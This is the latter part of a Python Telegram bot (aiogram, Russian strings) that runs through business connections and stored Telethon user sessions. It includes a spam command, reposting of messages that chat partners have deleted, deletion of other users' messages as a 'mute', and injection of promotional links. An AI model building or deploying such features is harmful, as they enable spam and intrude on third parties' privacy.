            f"{TEXT_COMMANDS_HELP}",
            parse_mode="HTML",
            reply_markup=ReplyKeyboardRemove()
        )
        await state.clear()
        
    except Exception as e:
        await message.answer(f"❌ Неверный пароль: {str(e)}\nПопробуй еще раз:")

# ==================== ОТКЛЮЧЕНИЕ ====================
@dp.message(Command("disconnect"))
async def cmd_disconnect(message: Message):
    if message.chat.type != "private":
        await message.answer("❌ Используйте в личных сообщениях.")
        return
    user_id = message.from_user.id
    if not get_session(user_id):
        await message.answer("❌ У вас нет активной сессии.")
        return
    delete_session(user_id)
    if user_id in telethon_clients:
        try:
            await telethon_clients[user_id].disconnect()
        except:
            pass
        del telethon_clients[user_id]
    delete_all_user_chats(user_id)
    delete_business_account(user_id)
    await message.answer(
        "✅ <b>Аккаунт отключен!</b>\n\n"
        "🔒 Все данные удалены с сервера:\n"
        "• Сессия удалена\n"
        "• Все чаты удалены\n"
        "• Данные пользователя удалены",
        parse_mode="HTML",
        reply_markup=ReplyKeyboardRemove()
    )

# ==================== ОСНОВНОЙ ОБРАБОТЧИК ====================
@dp.message()
@dp.business_message()
async def handle(message: Message):
    global bot_id, CHANNEL_LINK
    try:
        if not message.from_user or message.from_user.is_bot: return
        uid = int(message.from_user.id)
        chat_id = int(message.chat.id)
        bc_id = message.business_connection_id
        save_user_info(uid, message.from_user.username, message.from_user.first_name)
        owner_id = bc_owners.get(bc_id) if bc_id else None

        if bc_id:
            chat_name = message.chat.title or message.chat.first_name or "Чат"
            save_user_chat(uid, chat_id, chat_name)
            chat_tuple = (chat_id, bc_id)
            if chat_tuple in recent_business_chats:
                recent_business_chats.remove(chat_tuple)
            recent_business_chats.append(chat_tuple)
            if len(recent_business_chats) > 100:
                recent_business_chats.pop(0)

        if uid in banned_users or (owner_id and owner_id in banned_users): return

        if bc_id:
            if bc_id not in bc_owners:
                try:
                    conn_info = await bot.get_business_connection(bc_id)
                    bc_owners[bc_id] = int(conn_info.user.id)
                    save_user_info(conn_info.user.id, conn_info.user.username, conn_info.user.first_name)
                    save_business_account(conn_info.user.id, conn_info.user.username, conn_info.user.first_name)
                    owner_id = int(conn_info.user.id)
                except: pass
            is_from_me = (uid == owner_id) if owner_id else False
        else:
            is_from_me = (uid == chat_id) or (message.chat.type in ["group", "supergroup"])

        if bot_id is None:
            me = await bot.get_me()
            bot_id = me.id

        if bc_id:
            if bc_id not in active_chats: active_chats[bc_id] = set()
            active_chats[bc_id].add(chat_id)

        if message.text:
            cache_key = (chat_id, message.message_id)
            msg_cache[cache_key] = {
                "text": message.text, 
                "user": message.from_user.first_name or "Пользователь",
                "user_id": uid,
                "chat_id": chat_id,
                "bc_id": bc_id
            }
            if len(msg_cache) > 5000:
                msg_cache.pop(next(iter(msg_cache)))

        if uid in mutes and datetime.now() < mutes[uid]["until"]:
            await delete_msg(chat_id, message.message_id, bc_id)
            return

        if not is_from_me: return

        if chat_id in reply_guard_chats and message.reply_to_message:
            await delete_msg(chat_id, message.message_id, bc_id)
            return

        text_raw = message.text
        if not text_raw: return
        low = text_raw.lower().strip()
        task_key = (chat_id, bc_id)
        current_owner = owner_id or uid

        if is_calculator_expression(text_raw):
            result, error = calculate_expression(text_raw)
            if result is not None:
                formatted_result = f"{result:.10f}".rstrip('0').rstrip('.') if isinstance(result, float) else str(result)
                new_text = f"{text_raw} = <b>{formatted_result}</b>"
                edited = await edit_message(chat_id, message.message_id, new_text, bc_id, parse_mode="HTML")
                if not edited:
                    try:
                        kwargs = {"chat_id": chat_id, "text": new_text, "parse_mode": "HTML"}
                        if bc_id: kwargs["business_connection_id"] = bc_id
                        await bot.send_message(**kwargs)
                    except Exception as e: logging.error(f"Ошибка калькулятора: {e}")
                return
            elif error:
                try:
                    kwargs = {"chat_id": chat_id, "text": error, "parse_mode": "HTML"}
                    if bc_id: kwargs["business_connection_id"] = bc_id
                    await bot.send_message(**kwargs)
                except Exception as e: logging.error(f"Ошибка калькулятора: {e}")
                return

        if low == ".стоп":
            save_setting(chat_id, 'enabled_links', False)
            await clear_cmd(chat_id, message.message_id, bc_id)
            return
        if low == ".старт":
            save_setting(chat_id, 'enabled_links', True)
            await clear_cmd(chat_id, message.message_id, bc_id)
            return
        if low.startswith("+линк"):
            parts = text_raw.split(maxsplit=1)
            if len(parts) > 1:
                new_link = parts[1].strip()
                if not new_link.startswith("http"): new_link = "https://t.me/" + new_link.lstrip("@")
                CHANNEL_LINK = new_link
            await clear_cmd(chat_id, message.message_id, bc_id)
            return
        if low.startswith("подмена "):
            parts = text_raw.split(maxsplit=2)
            if len(parts) >= 2:
                if parts[1].lower() == "выкл":
                    save_substitution(chat_id, None, None)
                else:
                    mode = int(parts[2]) if len(parts) == 3 and parts[2] in ["1", "2"] else 1
                    save_substitution(chat_id, parts[1], mode)
            await clear_cmd(chat_id, message.message_id, bc_id)
            return
        if low == "печать -":
            save_setting(chat_id, 'typing_disabled', True)
            await clear_cmd(chat_id, message.message_id, bc_id)
            return
        if low == "печать +":
            save_setting(chat_id, 'typing_disabled', False)
            await clear_cmd(chat_id, message.message_id, bc_id)
            return
        if low == "+реплай":
            save_setting(chat_id, 'reply_guard', True)
            await clear_cmd(chat_id, message.message_id, bc_id)
            return
        if low == "-реплай":
            save_setting(chat_id, 'reply_guard', False)
            await clear_cmd(chat_id, message.message_id, bc_id)
            return
        if low == "ss":
            await clear_cmd(chat_id, message.message_id, bc_id)
            text = user_spam_texts.get(str(current_owner))
            if not text:
                kwargs = {
                    "chat_id": chat_id,
                    "text": "⚠️ Сначала задайте текст через команду: <code>set [текст]</code>",
                    "parse_mode": "HTML"
                }
                if bc_id: kwargs["business_connection_id"] = bc_id
                await bot.send_message(**kwargs)
                return
            reply_to = message.reply_to_message.message_id if message.reply_to_message else None
            if task_key in spam_tasks: spam_tasks[task_key].cancel()
            spam_tasks[task_key] = asyncio.create_task(spam_worker(chat_id, bc_id, reply_to, text))
            return
        if low == "dd":
            await clear_cmd(chat_id, message.message_id, bc_id)
            if task_key in spam_tasks:
                spam_tasks[task_key].cancel()
                del spam_tasks[task_key]
            return
        if low.startswith("set "):
            save_spam_text(str(current_owner), text_raw[4:].strip())
            await clear_cmd(chat_id, message.message_id, bc_id)
            return
        if low.startswith(".мут") or low.startswith("!мут") or low.startswith(".ут"):
            try:
                minutes = int(re.search(r"\d+", text_raw).group())
                if message.reply_to_message and message.reply_to_message.from_user:
                    target_user = message.reply_to_message.from_user
                    target_id = target_user.id
                    target_name = target_user.first_name
                else:
                    target_id = chat_id
                    target_name = message.chat.first_name or "Пользователь"
                mutes[target_id] = {"until": datetime.now() + timedelta(minutes=minutes)}
                asyncio.create_task(unmute(target_id, chat_id, bc_id, target_name))
                await clear_cmd(chat_id, message.message_id, bc_id)
                user_link = get_user_mention(target_id, target_name)
                kwargs = {
                    "chat_id": chat_id,
                    "text": f"🔇 {user_link} выдан <b>МУТ</b> на {minutes} мин.",
                    "parse_mode": "HTML"
                }
                if bc_id: kwargs["business_connection_id"] = bc_id
                await bot.send_message(**kwargs)
            except: pass
            return
        if low in [".размут", "!размут"]:
            if message.reply_to_message and message.reply_to_message.from_user:
                target_user = message.reply_to_message.from_user
                target_id = target_user.id
                target_name = target_user.first_name
            else:
                target_id = chat_id
                target_name = message.chat.first_name or "Пользователь"
            mutes.pop(target_id, None)
            await clear_cmd(chat_id, message.message_id, bc_id)
            user_link = get_user_mention(target_id, target_name)
            kwargs = {
                "chat_id": chat_id,
                "text": f"🔊 С {user_link} снят <b>МУТ</b>.",
                "parse_mode": "HTML"
            }
            if bc_id: kwargs["business_connection_id"] = bc_id
            await bot.send_message(**kwargs)
            return
        if low in ["мой ид", "моид"]:
            await clear_cmd(chat_id, message.message_id, bc_id)
            my_link = get_user_mention(uid, message.from_user.first_name)
            kwargs = {
                "chat_id": chat_id,
                "text": f"🆔 {my_link} (<code>{uid}</code>)",
                "parse_mode": "HTML"
            }
            if bc_id: kwargs["business_connection_id"] = bc_id
            await bot.send_message(**kwargs)
            return
        if low in ["твой ид", "твоид"]:
            await clear_cmd(chat_id, message.message_id, bc_id)
            target_user = message.reply_to_message.from_user if message.reply_to_message else None
            target_id = target_user.id if target_user else (chat_id if chat_id > 0 else None)
            if target_id:
                t_fname = target_user.first_name if target_user else None
                t_link = get_user_mention(target_id, t_fname)
                kwargs = {
                    "chat_id": chat_id,
                    "text": f"🆔 {t_link} (<code>{target_id}</code>)",
                    "parse_mode": "HTML"
                }
                if bc_id: kwargs["business_connection_id"] = bc_id
                await bot.send_message(**kwargs)
            return
        if low == "!команды":
            await clear_cmd(chat_id, message.message_id, bc_id)
            kwargs = {
                "chat_id": chat_id,
                "text": TEXT_COMMANDS_HELP,
                "parse_mode": "HTML"
            }
            if bc_id: kwargs["business_connection_id"] = bc_id
            await bot.send_message(**kwargs)
            return

        final_text = text_raw
        need_modify = False
        parse_mode = None
        if chat_id in substitutions:
            sub = substitutions[chat_id]
            final_text = f"{sub['text']} {text_raw}" if sub["mode"] == 1 else f"{text_raw} {sub['text']}"
            need_modify = True
            parse_mode = "HTML"
        if chat_id in link_chats and CHANNEL_LINK:
            has_link = False
            if message.entities:
                for entity in message.entities:
                    if entity.type in ["url", "text_link"]:
                        has_link = True
                        break
            if not has_link and CHANNEL_LINK not in final_text:
                final_text = f'<a href="{CHANNEL_LINK}">{final_text}</a>'
                need_modify = True
                parse_mode = "HTML"
        if need_modify:
            await edit_message(chat_id, message.message_id, final_text, bc_id, parse_mode=parse_mode)

    except Exception as e:
        logging.error(f"❌ Ошибка обработки сообщения: {e}")

# ==================== ОБРАБОТЧИК КНОПОК ====================
@dp.callback_query()
async def process_callbacks(callback: CallbackQuery, state: FSMContext):
    data = callback.data
    uid = callback.from_user.id
    
    if data == "btn_features":
        await callback.message.answer(TEXT_COMMANDS_HELP, parse_mode="HTML")
        await callback.answer()
        return
    if data == "btn_how_to_connect":
        await callback.answer()
        return
    if data == "btn_group_auth":
        await group_auth(callback, state)
        return
    if data == "btn_admin_panel":
        if uid != ADMIN_ID:
            await callback.answer()
            return
        await callback.message.answer("👑 <b>Панель Администратора</b>", reply_markup=get_admin_keyboard(), parse_mode="HTML")
        await callback.answer()
        return
    if uid != ADMIN_ID:
        await callback.answer()
        return
    if data == "admin_panel_back":
        await callback.message.edit_text("👑 <b>Панель Администратора</b>", reply_markup=get_admin_keyboard(), parse_mode="HTML")
        await callback.answer()
        return
    if data == "admin_stats":
        business_users = get_business_accounts()
        manual_users = get_all_users()
        total_manual = len([u for u in manual_users if u[4] == 'manual'])
        total_chats = sum(len(get_user_chats(u[0])) for u in manual_users)
        await callback.message.edit_text(
            f"📊 <b>СТАТИСТИКА:</b>\n\n"
            f"• Бизнес-аккаунтов: <code>{len(business_users)}</code>\n"
            f"• Ручных пользователей: <code>{total_manual}</code>\n"
            f"• Всего пользователей: <code>{len(manual_users)}</code>\n"
            f"• Всего чатов: <code>{total_chats}</code>\n"
            f"• Забанено: <code>{len(banned_users)}</code>",
            reply_markup=get_admin_keyboard(), parse_mode="HTML"
        )
        await callback.answer()
        return
    if data == "admin_users":
        await callback.message.edit_text(
            "👥 <b>ВСЕ ПОЛЬЗОВАТЕЛИ</b>\n\n"
            "Выберите пользователя для управления:",
            reply_markup=get_users_keyboard(0),
            parse_mode="HTML"
        )
        await callback.answer()
        return
    if data.startswith("users_page_"):
        page = int(data.split("_")[2])
        await callback.message.edit_text(
            "👥 <b>ВСЕ ПОЛЬЗОВАТЕЛИ</b>\n\n"
            "Выберите пользователя для управления:",
            reply_markup=get_users_keyboard(page),
            parse_mode="HTML"
        )
        await callback.answer()
        return
    if data.startswith("user_"):
        user_id = int(data.split("_")[1])
        user_link = get_user_mention(user_id)
        chats = get_user_chats(user_id)
        chats_count = len(chats)
        kb = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text=f"📋 Чаты ({chats_count})", callback_data=f"view_chats_{user_id}")],
            [InlineKeyboardButton(text="❌ Удалить из списка", callback_data=f"delete_user_{user_id}")],
            [InlineKeyboardButton(text="🚫 Забанить", callback_data=f"ban_user_{user_id}")],
            [InlineKeyboardButton(text="🔙 Назад", callback_data="admin_users")]
        ])
        await callback.message.edit_text(
            f"👤 <b>Информация о пользователе</b>\n\n"
            f"ID: <code>{user_id}</code>\n"
            f"Имя: {user_link}\n"
            f"Чатов: <code>{chats_count}</code>",
            reply_markup=kb,
            parse_mode="HTML"
        )
        await callback.answer()
        return
    if data.startswith("view_chats_"):
        user_id = int(data.split("_")[2])
        user_first_name = user_names.get(user_id, "Пользователь")
        chats = get_user_chats(user_id)
        if not chats:
            await callback.message.edit_text(
                f"📋 <b>Чаты пользователя {get_user_mention(user_id, user_first_name)}</b>\n\n"
                f"❌ У пользователя нет сохраненных чатов.",
                reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                    [InlineKeyboardButton(text="🔙 Назад к пользователю", callback_data=f"user_{user_id}")]
                ]),
                parse_mode="HTML"
            )
            await callback.answer()
            return
        await callback.message.edit_text(
            f"📋 <b>Чаты пользователя {get_user_mention(user_id, user_first_name)}</b>\n\n"
            f"Всего чатов: <code>{len(chats)}</code>\n\n"
            f"Нажмите на чат, чтобы удалить его:",
            reply_markup=get_user_chats_keyboard(user_id, 0),
            parse_mode="HTML"
        )
        await callback.answer()
        return
    if data.startswith("chats_page_"):
        parts = data.split("_")
        user_id = int(parts[2])
        page = int(parts[3])
        user_first_name = user_names.get(user_id, "Пользователь")
        chats = get_user_chats(user_id)
        await callback.message.edit_text(
            f"📋 <b>Чаты пользователя {get_user_mention(user_id, user_first_name)}</b>\n\n"
            f"Всего чатов: <code>{len(chats)}</code>\n\n"
            f"Нажмите на чат, чтобы удалить его:",
            reply_markup=get_user_chats_keyboard(user_id, page),
            parse_mode="HTML"
        )
        await callback.answer()
        return
    if data.startswith("delete_chat_"):
        parts = data.split("_")
        user_id = int(parts[2])
        chat_id = int(parts[3])
        chat_name = ""
        chats = get_user_chats(user_id)
        for cid, name in chats:
            if cid == chat_id:
                chat_name = name
                break
        confirm_kb = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="✅ Да, удалить", callback_data=f"confirm_delete_chat_{user_id}_{chat_id}")],
            [InlineKeyboardButton(text="❌ Отмена", callback_data=f"view_chats_{user_id}")]
        ])
        await callback.message.edit_text(
            f"⚠️ <b>ВНИМАНИЕ!</b>\n\n"
            f"Вы уверены, что хотите удалить чат <b>«{chat_name}»</b> у пользователя {get_user_mention(user_id)}?\n\n"
            f"<b>Это действие необратимо!</b>",
            reply_markup=confirm_kb,
            parse_mode="HTML"
        )
        await callback.answer()
        return
    if data.startswith("confirm_delete_chat_"):
        parts = data.split("_")
        user_id = int(parts[3])
        chat_id = int(parts[4])
        delete_user_chat(user_id, chat_id)
        await callback.answer("✅ Чат удален!", show_alert=True)
        user_first_name = user_names.get(user_id, "Пользователь")
        chats = get_user_chats(user_id)
        await callback.message.edit_text(
            f"📋 <b>Чаты пользователя {get_user_mention(user_id, user_first_name)}</b>\n\n"
            f"Всего чатов: <code>{len(chats)}</code>\n\n"
            f"Нажмите на чат, чтобы удалить его:",
            reply_markup=get_user_chats_keyboard(user_id, 0),
            parse_mode="HTML"
        )
        await callback.answer()
        return
    if data.startswith("delete_all_chats_"):
        user_id = int(data.split("_")[3])
        user_first_name = user_names.get(user_id, "Пользователь")
        chats = get_user_chats(user_id)
        if not chats:
            await callback.answer("❌ У пользователя нет чатов!", show_alert=True)
            return
        confirm_kb = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="✅ Да, удалить ВСЕ", callback_data=f"confirm_delete_all_chats_{user_id}")],
            [InlineKeyboardButton(text="❌ Отмена", callback_data=f"view_chats_{user_id}")]
        ])
        await callback.message.edit_text(
            f"⚠️ <b>ВНИМАНИЕ!</b>\n\n"
            f"Вы уверены, что хотите удалить <b>ВСЕ ЧАТЫ</b> пользователя {get_user_mention(user_id, user_first_name)}?\n\n"
            f"Будет удалено <code>{len(chats)}</code> чатов.\n\n"
            f"<b>Это действие необратимо!</b>",
            reply_markup=confirm_kb,
            parse_mode="HTML"
        )
        await callback.answer()
        return
    if data.startswith("confirm_delete_all_chats_"):
        user_id = int(data.split("_")[4])
        user_first_name = user_names.get(user_id, "Пользователь")
        count = delete_all_user_chats(user_id)
        await callback.answer(f"✅ Удалено {count} чатов!", show_alert=True)
        await callback.message.edit_text(
            f"📋 <b>Чаты пользователя {get_user_mention(user_id, user_first_name)}</b>\n\n"
            f"❌ Все чаты удалены.",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="🔙 Назад к пользователю", callback_data=f"user_{user_id}")]
            ]),
            parse_mode="HTML"
        )
        await callback.answer()
        return
    if data.startswith("delete_user_"):
        user_id = int(data.split("_")[2])
        delete_business_account(user_id)
        await callback.answer("✅ Пользователь удален из списка!", show_alert=True)
        await callback.message.edit_text(
            "👥 <b>ВСЕ ПОЛЬЗОВАТЕЛИ</b>\n\n"
            "Выберите пользователя для управления:",
            reply_markup=get_users_keyboard(0),
            parse_mode="HTML"
        )
        await callback.answer()
        return
    if data.startswith("ban_user_"):
        user_id = int(data.split("_")[2])
        if user_id in banned_users:
            set_user_ban(user_id, False)
            await callback.answer("✅ Пользователь разбанен!", show_alert=True)
        else:
            set_user_ban(user_id, True)
            await callback.answer("🚫 Пользователь забанен!", show_alert=True)
        user_link = get_user_mention(user_id)
        status = "забанен" if user_id in banned_users else "разбанен"
        chats = get_user_chats(user_id)
        chats_count = len(chats)
        await callback.message.edit_text(
            f"👤 <b>Информация о пользователе</b>\n\n"
            f"ID: <code>{user_id}</code>\n"
            f"Имя: {user_link}\n"
            f"Статус: {status}\n"
            f"Чатов: <code>{chats_count}</code>\n\n"
            f"Выберите действие:",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text=f"📋 Чаты ({chats_count})", callback_data=f"view_chats_{user_id}")],
                [InlineKeyboardButton(text="❌ Удалить из списка", callback_data=f"delete_user_{user_id}")],
                [InlineKeyboardButton(text="🚫 Забанить/Разбанить", callback_data=f"ban_user_{user_id}")],
                [InlineKeyboardButton(text="🔙 Назад", callback_data="admin_users")]
            ]),
            parse_mode="HTML"
        )
        await callback.answer()
        return
    if data == "admin_ban_prompt":
        await callback.message.edit_text(
            "🚫 <b>Управление банами</b>\n\n"
            "Команды бана/разбана:\n\n"
            "• <code>/ban 123456789</code> или <code>/ban @username</code>\n"
            "• <code>/unban 123456789</code> или <code>/unban @username</code>",
            reply_markup=get_admin_keyboard(), parse_mode="HTML"
        )
        await callback.answer()
        return
    if data == "admin_add_user":
        await callback.message.edit_text(
            "➕ <b>Добавление пользователя</b>\n\n"
            "Отправьте ID или @username пользователя.",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="🔙 Назад", callback_data="admin_panel_back")]
            ]),
            parse_mode="HTML"
        )
        await callback.answer()
        return
    await callback.answer()

# ==================== АДМИН-КОМАНДЫ ====================
async def resolve_user_id(target_raw: str):
    target = target_raw.strip()
    if target.startswith("@"):
        uname = target.lstrip("@").lower()
        res = user_usernames.get(uname)
        return int(res) if res else None
    elif target.isdigit():
        return int(target)
    return None

@dp.message(Command("ban"))
async def cmd_ban(message: Message):
    if message.from_user.id != ADMIN_ID: return
    try:
        arg = message.text.split(maxsplit=1)[1]
        target_id = await resolve_user_id(arg)
        if target_id:
            set_user_ban(target_id, True)
            delete_business_account(target_id)
            user_link = get_user_mention(target_id)
            await message.answer(f"🚫 {user_link} <b>заблокирован</b>!", parse_mode="HTML")
        else:
            await message.answer(f"❌ Пользователь <code>{arg}</code> не найден.", parse_mode="HTML")
    except:
        await message.answer("Формат: <code>/ban 123456789</code> или <code>/ban @username</code>", parse_mode="HTML")

@dp.message(Command("unban"))
async def cmd_unban(message: Message):
    if message.from_user.id != ADMIN_ID: return
    try:
        arg = message.text.split(maxsplit=1)[1]
        target_id = await resolve_user_id(arg)
        if target_id:
            set_user_ban(target_id, False)
            user_link = get_user_mention(target_id)
            await message.answer(f"✅ {user_link} <b>разблокирован</b>!", parse_mode="HTML")
        else:
            await message.answer(f"❌ Пользователь <code>{arg}</code> не найден.", parse_mode="HTML")
    except:
        await message.answer("Формат: <code>/unban 123456789</code> или <code>/unban @username</code>", parse_mode="HTML")

# ==================== ОБРАБОТЧИК УДАЛЕНИЙ ====================
@dp.update()
async def global_update_handler(update: Update, bot: Bot):
    try:
        if update.deleted_business_messages:
            data = update.deleted_business_messages
            bc_id = data.business_connection_id
            msg_ids = set(data.message_ids)
            for (cached_chat_id, cached_msg_id), cached in list(msg_cache.items()):
                if cached_msg_id in msg_ids:
                    uid = cached['user_id']
                    if uid == bot_id:
                        msg_cache.pop((cached_chat_id, cached_msg_id), None)
                        continue
                    user_link = get_user_mention(uid, cached['user'])
                    text_to_send = (
                        f"👤 {user_link} <b>удалил(а) сообщение ↓</b>\n\n"
                        f"💬 {cached['text']}"
                    )
                    kwargs = {
                        "chat_id": cached_chat_id,
                        "text": text_to_send,
                        "parse_mode": "HTML"
                    }
                    bc_target = bc_id or cached.get("bc_id")
                    if bc_target: kwargs["business_connection_id"] = bc_target
                    await bot.send_message(**kwargs)
                    msg_cache.pop((cached_chat_id, cached_msg_id), None)
    except Exception as e:
        logging.error(f"❌ Ошибка обработчика удалений: {e}")

# ==================== ВЕБ-СЕРВЕР ====================
async def handle_ping(request):
    return web.Response(text="Bot is running!")

async def start_web_server():
    app = web.Application()
    app.router.add_get('/', handle_ping)
    app.router.add_get('/health', handle_ping)
    runner = web.AppRunner(app)
    await runner.setup()
    port = int(os.environ.get("PORT", 10000))
    site = web.TCPSite(runner, "0.0.0.0", port)
    await site.start()

# ==================== ЗАПУСК ====================
async def main():
    await start_web_server()
    try:
        await bot.delete_webhook(drop_pending_updates=True)
    except:
        pass
    asyncio.create_task(global_typing_loop())
    asyncio.create_task(promo_broadcaster())
    asyncio.create_task(check_promo_deletions())
    asyncio.create_task(clean_inactive_connections())
    logging.info("🚀 БОТ ЗАПУЩЕН!")
    await dp.start_polling(
        bot,
        allowed_updates=["message", "business_connection", "business_message", "edited_business_message", "deleted_business_messages", "callback_query"]
    )

if __name__ == "__main__":
    asyncio.run(main())
